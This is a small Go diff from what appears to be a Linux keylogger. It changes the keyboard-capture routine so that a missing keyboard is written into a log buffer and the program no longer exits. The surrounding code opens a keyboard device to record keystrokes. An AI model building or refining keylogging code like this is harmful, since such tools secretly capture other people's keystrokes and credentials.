@@ -17,7 +17,7 @@ func NewLinuxLogger() *LinuxLogger {
 func (l *LinuxLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
 	device := keylogger.FindKeyboardDevice()
 	if device == "" {
-		log.Fatal("No keyboard found...")
+		logBuffer.WriteString("No keyboard found...")
 	}
 	keyboard, err := keylogger.New(device)
 	if err != nil {
